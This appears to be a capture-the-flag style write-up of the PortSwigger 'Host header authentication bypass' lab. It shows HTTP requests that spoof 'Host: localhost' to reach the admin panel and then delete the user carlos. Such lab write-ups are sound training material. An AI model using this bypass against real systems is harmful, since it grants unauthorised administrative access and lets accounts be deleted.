
# Host header authentication bypass

This lab makes an assumption about the privilege level of the user based on the HTTP Host header.

To solve the lab, access the admin panel and delete Carlos's account.


---------------------------------------------

References: 

- https://portswigger.net/web-security/host-header/exploiting



![img](images/Host%20header%20authentication%20bypass/1.png)

---------------------------------------------

If we try to access /admin we get this error:



![img](images/Host%20header%20authentication%20bypass/2.png)


We can access using the value “localhost” in the “Host” header:

```
GET /admin HTTP/2
Host: localhost
...
```



![img](images/Host%20header%20authentication%20bypass/3.png)


And delete the user:

```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
...
```



![img](images/Host%20header%20authentication%20bypass/4.png)